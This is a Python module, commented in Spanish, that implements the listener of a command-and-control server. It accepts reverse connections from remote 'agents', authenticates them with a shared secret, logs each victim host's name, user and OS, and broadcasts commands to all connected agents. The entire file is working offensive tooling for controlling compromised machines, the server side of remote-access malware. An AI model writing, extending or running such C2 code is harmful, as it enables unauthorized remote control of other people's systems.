"""Servidor TCP del C2: acepta conexiones inversas y administra los agentes."""
from __future__ import annotations

import asyncio
import contextlib
import logging
import time
from typing import Callable

from .agent import AgentConnection
from .protocol import read_message

log = logging.getLogger("c2.manager")

HANDSHAKE_TIMEOUT = 10.0


class AgentManager:
    """Registro de agentes conectados y utilidades de envio de comandos."""

    def __init__(
        self,
        bind_host: str,
        port: int,
        shared_secret: str = "",
        on_event: Callable[[str], None] | None = None,
    ) -> None:
        self.bind_host = bind_host
        self.port = port
        self.shared_secret = shared_secret
        self.on_event = on_event
        self.started_at = time.monotonic()
        self.total_connections = 0
        self._agents: dict[str, AgentConnection] = {}
        self._server: asyncio.Server | None = None

    @property
    def agents(self) -> list[AgentConnection]:
        return sorted(self._agents.values(), key=lambda agent: agent.connected_at)

    def find(self, token: str) -> AgentConnection | None:
        token = token.strip()
        if not token:
            return None
        if token.isdigit():
            agents = self.agents
            index = int(token)
            if 0 <= index < len(agents):
                return agents[index]
            return None
        exact = self._agents.get(token)
        if exact is not None:
            return exact
        matches = [agent for agent in self._agents.values() if agent.agent_id.startswith(token)]
        if len(matches) == 1:
            return matches[0]
        return None

    async def start(self) -> None:
        self._server = await asyncio.start_server(self._handle_connection, self.bind_host, self.port)
        self.port = self._server.sockets[0].getsockname()[1]
        log.info("escuchando en %s:%s", self.bind_host, self.port)
        self._emit(f"servidor escuchando en {self.bind_host}:{self.port}")

    async def stop(self) -> None:
        if self._server is not None:
            self._server.close()
        for agent in list(self._agents.values()):
            agent.fail_pending(ConnectionError("servidor detenido"))
            agent.close()
        self._agents.clear()
        if self._server is not None:
            with contextlib.suppress(Exception):
                await asyncio.wait_for(self._server.wait_closed(), timeout=3)

    async def broadcast(self, name: str, args: dict | None = None, timeout: float = 10.0):
        agents = self.agents
        responses = await asyncio.gather(
            *(agent.request(name, args, timeout) for agent in agents),
            return_exceptions=True,
        )
        return list(zip(agents, responses))

    async def _handle_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        peer = writer.get_extra_info("peername")
        peer_str = f"{peer[0]}:{peer[1]}" if peer else "desconocido"
        agent: AgentConnection | None = None
        try:
            hello = await asyncio.wait_for(read_message(reader), timeout=HANDSHAKE_TIMEOUT)
            if hello is None:
                return
            if hello.get("type") != "hello":
                raise ValueError(f"se esperaba 'hello', llego '{hello.get('type')}'")
            if self.shared_secret and hello.get("secret") != self.shared_secret:
                log.warning("conexion rechazada por secreto invalido desde %s", peer_str)
                self._emit(f"[!] conexion rechazada (secreto invalido) desde {peer_str}")
                return
            agent = AgentConnection(
                agent_id=str(hello.get("agent_id") or "sin-id"),
                peer=peer_str,
                reader=reader,
                writer=writer,
                hostname=str(hello.get("hostname", "")),
                os_info=str(hello.get("os", "")),
                user=str(hello.get("user", "")),
                version=str(hello.get("version", "")),
            )
            previous = self._agents.pop(agent.agent_id, None)
            if previous is not None:
                previous.fail_pending(ConnectionError("reemplazado por una conexion nueva"))
                previous.close()
                self._emit(f"[!] agente reconectado: {agent.agent_id} (se reemplazo la conexion anterior)")
            else:
                self._emit(
                    f"[+] agente conectado: {agent.agent_id} "
                    f"host={agent.hostname or '?'} user={agent.user or '?'} desde {peer_str}"
                )
            self._agents[agent.agent_id] = agent
            self.total_connections += 1
            log.info("agente conectado: %s desde %s", agent.agent_id, peer_str)
            await self._read_loop(agent)
        except (asyncio.TimeoutError, ValueError) as exc:
            log.warning("handshake fallido desde %s: %s", peer_str, exc)
            self._emit(f"[!] handshake fallido desde {peer_str}: {exc}")
        except (ConnectionError, asyncio.IncompleteReadError):
            pass
        finally:
            if agent is not None and self._agents.get(agent.agent_id) is agent:
                self._agents.pop(agent.agent_id, None)
                agent.fail_pending(ConnectionError("agente desconectado"))
                self._emit(f"[-] agente desconectado: {agent.agent_id}")
                log.info("agente desconectado: %s", agent.agent_id)
            with contextlib.suppress(Exception):
                writer.close()

    async def _read_loop(self, agent: AgentConnection) -> None:
        while True:
            message = await read_message(agent.reader)
            if message is None:
                return
            agent.touch()
            message_type = message.get("type")
            if message_type in ("result", "pong"):
                agent.resolve(message)
            elif message_type != "heartbeat":
                log.debug("mensaje ignorado de %s: %s", agent.agent_id, message_type)

    def _emit(self, text: str) -> None:
        if self.on_event is not None:
            with contextlib.suppress(Exception):
                self.on_event(text)
